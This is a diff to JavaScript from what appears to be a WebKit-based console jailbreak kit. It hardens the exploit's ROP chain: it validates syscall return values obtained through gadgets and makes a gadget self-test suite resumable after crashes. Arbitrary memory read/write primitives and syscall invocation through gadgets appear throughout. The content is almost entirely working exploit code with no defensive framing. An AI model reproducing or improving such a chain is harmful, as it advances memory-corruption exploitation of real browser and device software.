@@ -1204,7 +1204,15 @@ async function prepare(p) {
     if (pid.low == 0) {
         throw new Error("Webkit exploit failed.");
     }
-    jbmark("PREP-GETPID-OK", "pid=" + pid.low);
+    /* getpid() cannot fail and a pid is a small positive integer, so -1 (or
+       anything with high bits set) means the chain ran but did NOT return what
+       the syscall returned -- a wrong stub, or rax clobbered before
+       write_result. The old guard only rejected 0, so 0xFFFFFFFF sailed
+       through and every syscall return value downstream was suspect. */
+    const pidOK = pid.hi === 0 && pid.low > 0 && pid.low < 0x100000;
+    jbmark("PREP-GETPID-OK", "pid=" + pid.low + (pidOK ? ""
+        : " *** IMPLAUSIBLE (0x" + pid.toString() + ") -- getpid cannot fail,"
+        + " so the syscall return path is wrong ***"));
     crumb("OK");
 
     /* Gadget conformance suite.
@@ -1226,14 +1234,40 @@ async function prepare(p) {
         const bad = [];
         const eq = (v, lo, hi) => v.low === (lo >>> 0) && v.hi === (hi >>> 0);
 
-        const runTest = async (name, build, check) => {
+        /* Resumable across runs. A gadget that desyncs the chain kills the
+           process, so without this the suite dies at the same test every time
+           and never reaches the ones after it. Mark each test "pending" and
+           commit that BEFORE running it: if the process dies, the next run
+           sees the pending mark, records a crash, and skips straight past it.
+           A few reloads therefore enumerate every broken gadget instead of
+           re-finding the first one forever. */
+        ps.gt = ps.gt || {};
+        const gtSave = () => psSave();
+        for (const k in ps.gt) if (ps.gt[k] === "pending") {
+            ps.gt[k] = "CRASH";
+            bad.push(k + "=CRASHED-the-chain");
+        }
+        gtSave();
+
+        const runTest = async (name, build, check, selfWrites) => {
+            if (ps.gt[name]) {                      // already decided
+                if (ps.gt[name] !== "ok" && bad.indexOf(name) === -1
+                    && !bad.some(b => b.indexOf(name + "=") === 0))
+                    bad.push(name + "=" + ps.gt[name]);
+                return;
+            }
             crumb("g:" + name);
+            ps.gt[name] = "pending";
+            gtSave();
             p.write8(out, new int64(0xDEAD0000, 0xDEAD0000));
             build();
-            chain.write_result(out);
+            if (!selfWrites) chain.write_result(out);
             await chain.run();
             const got = p.read8(out);
-            if (!check(got)) bad.push(name + "=0x" + got.toString());
+            const okv = check(got);
+            ps.gt[name] = okv ? "ok" : ("0x" + got.toString());
+            gtSave();
+            if (!okv) bad.push(name + "=0x" + got.toString());
         };
 
         try {
@@ -1258,27 +1292,36 @@ async function prepare(p) {
                 }, (v) => eq(v, exp, 0));
             }
 
-            // push_write4 uses `mov [rdi], eax`, a different store from the one
-            // the 8-byte path now takes -- verify it independently.
-            crumb("g:push_write4");
-            p.write8(out, new int64(0, 0));
-            chain.push_write4(out, 0x41424344);
-            await chain.run();
-            const w4 = p.read8(out);
-            if (!eq(w4, 0x41424344, 0)) bad.push("push_write4=0x" + w4.toString());
+            // push_write4 uses `mov [rdi], eax`, a different store from the
+            // 8-byte path, so it needs its own check. Both go through runTest
+            // so they are skipped once decided, like every other test.
+            await runTest("push_write4", () => {
+                chain.push_write4(out, 0x41424344);
+            }, (v) => eq(v, 0x41424344, 0), true);
 
-            crumb("g:push_copy8");
             p.write8(cell, new int64(0x55667788, 0x00009900));
-            p.write8(out, new int64(0, 0));
-            chain.push_copy8(out, cell);
-            await chain.run();
-            const c8 = p.read8(out);
-            if (!eq(c8, 0x55667788, 0x00009900)) bad.push("push_copy8=0x" + c8.toString());
+            await runTest("push_copy8", () => {
+                chain.push_copy8(out, cell);
+            }, (v) => eq(v, 0x55667788, 0x00009900), true);
+
+            /* getpid came back 0xFFFFFFFF. Cross-check the return path with
+               three more syscalls that also cannot fail and have known-shaped
+               results: if all four return -1 the calling convention itself is
+               wrong, whereas one bad answer means just that stub is wrong. */
+            for (const [nm, nr, ck] of [
+                ["syscall:getpid", 0x14, (v) => v.hi === 0 && v.low > 0 && v.low < 0x100000],
+                ["syscall:getuid", 0x18, (v) => v.hi === 0 && v.low < 0x100000],
+                ["syscall:getgid", 0x2f, (v) => v.hi === 0 && v.low < 0x100000],
+                ["syscall:getppid", 0x1b, (v) => v.hi === 0 && v.low < 0x100000]]) {
+                if (!(nr in syscall_map)) continue;
+                await runTest(nm, () => { chain.fcall(syscalls[nr]); }, ck);
+            }
 
             crumb("g:done");
             jbmark("GADGET-SELFTEST", bad.length
                 ? "FAILED " + bad.length + ": " + bad.join("  ")
-                : "all verified by execution (load, add, shifts, write4, copy8)");
+                : "all verified by execution (load, add, shifts, write4, copy8,"
+                + " and four no-arg syscalls)");
             if (bad.length)
                 throw new Error("gadget self-test: these produced the wrong result"
                     + " when actually executed -- " + bad.join("  ")
@@ -1296,4 +1339,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=33`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=34`);
